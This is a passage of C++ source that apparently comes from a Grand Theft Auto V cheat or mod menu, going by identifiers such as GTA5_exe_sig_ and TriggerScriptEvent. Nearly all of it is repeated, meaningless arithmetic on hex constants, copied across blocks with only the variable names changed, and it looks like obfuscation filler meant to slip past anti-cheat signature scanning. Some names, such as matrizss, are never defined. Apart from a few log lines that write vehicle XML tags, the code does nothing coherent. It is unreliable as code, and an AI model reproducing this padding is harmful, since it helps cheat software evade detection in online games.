				offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
				offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (5) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
			if (TriggerScriptEvent[4] > 50.0f)
			{
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
			}
			a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
			a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
			a = 0.0f;
			a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
			b = 0.0f;
			TriggerScriptEvent[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
			TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			TriggerScriptEvent[4] = TriggerScriptEvent[1];
			TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
			offset = (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
			offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
			TriggerScriptEvent[4] = (0xA12 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
			offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);

			if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + 0xA12;
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
			}
			else
			{
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[1] = (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			}
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
			a = 0.0f;
			b = 0.0f;
			if (TriggerScriptEvent[4] > 50.0f)
			{
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
			}
			a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
			a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
			a = 0.0f;
			a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
			b = 0.0f;
			TriggerScriptEvent[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + 0xA12;
			TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
			TriggerScriptEvent[4] = TriggerScriptEvent[1];
			TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
			TriggerScriptEvent[1] = (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
			TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + TriggerScriptEvent[1];
			TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			Extern_Reader::LOG::LogSemHora("<WindowTint>1</WindowTint>");
			Extern_Reader::LOG::LogSemHora("<BulletProofTyres>false</BulletProofTyres>");
			Extern_Reader::LOG::LogSemHora("<DirtLevel>0</DirtLevel>");
			Extern_Reader::LOG::LogSemHora("<PaintFade>0.298039228</PaintFade>");

			if (offset > aaaaaa)
			{
				matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
				matriz[3] = (0xB1231 * 0xA) - (ponteiro * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
				matriz[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
			}
			else
			{
				offset = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
				offset = (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + aaaaaa;
				offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - ponteiro + 0xA12;
				offset = (ponteiro * 0xA) + (matriz[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
			if (matriz[4] > 50.0f)
			{
				matriz[4] = matriz[1];
			}
			a2 = (matriz[4]) / (2 * matriz[2]);
			a1 = (matriz[3] + (2)) / (2 * matriz[2]);
			offset = (ponteiro * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (matriz[3] + (5)) / (2 * matriz[2]);
			aaaaaa = ponteiro * 2;
			a = 0.0f;
			a1 = (matriz[3] + (4)) / (2 * matriz[2]);
			b = 0.0f;
			matriz[3] = (0xB1231 * 0xA) + (ponteiro * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			offset = (0xB1231 * 0xA12) + (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + ponteiro + 0xA12;
			matriz[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) + offset / (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
			matriz[4] = matriz[1];
			matriz[7] = (0xB1231 * 0xA) + matriz[2];
			offset = (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + aaaaaa;
			offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) + offset;
			matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			a2 = (matriz[4] + (2)) / (2 * matriz[2]);
			offset = (ponteiro * 0xA) + (matriz[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > aaaaaa)
			{
			}
			else
				a1 = (matriz[3] + (65)) / (2 * matriz[2]);
			a2 = (matriz[4] - (3)) / (2 * matriz[2]);

			if (matriz[1] > aaaaaa)
			{
				matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
				matriz[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
				matriz[5] = (0xB1231 * 0xA12) + (matriz[1] * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + 0xA12;
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
			}
			else
			{
				matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
				matriz[1] = (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + aaaaaa;
				matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - matriz[1];
				matriz[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) - 0xBB;
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			}
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
			a = 0.0f;
			b = 0.0f;
			if (matriz[4] > 50.0f)
			{
				matriz[4] = matriz[1];
			}
			a2 = (matriz[4]) / (2 * matriz[2]);
			a1 = (matriz[3] + (2)) / (2 * matriz[2]);
			matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (matriz[3] + (5)) / (2 * matriz[2]);
			aaaaaa = 0xB2 * 2;
			a = 0.0f;
			a1 = (matriz[3] + (4)) / (2 * matriz[2]);
			b = 0.0f;
			matriz[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			matriz[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			matriz[5] = (0xB1231 * 0xA12) + (matriz[1] + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + 0xA12;
			matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
			matriz[4] = matriz[1];
			matriz[7] = (0xB1231 * 0xA) + matriz[2];
			matriz[1] = (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + aaaaaa;
			matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + matriz[1];
			matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			a2 = (matriz[4] + (2)) / (2 * matriz[2]);
			matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) * 0xBB;
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			if (matriz[1] > aaaaaa)
			{
			}
			else
				a1 = (matriz[3] + (65)) / (2 * matriz[2]);
			a2 = (matriz[4] - (3)) / (2 * matriz[2]);

			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
			}
			else
			{
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
				offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
			if (GTA5_exe_sig_[4] > 50.0f)
			{
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			}
			a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
			a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
			a = 0.0f;
			a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
			b = 0.0f;
			GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
			GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
			offset = (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
			offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
			GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
			offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);

			if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + 0xA12;
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
			}
			else
			{
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[1] = (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			}
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
			a = 0.0f;
			b = 0.0f;
			if (GTA5_exe_sig_[4] > 50.0f)
			{
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			}
			a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
			a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
			a = 0.0f;
			a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
			b = 0.0f;
			GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + 0xA12;
			GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
			GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
			GTA5_exe_sig_[1] = (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
			GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + GTA5_exe_sig_[1];
			GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);


			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
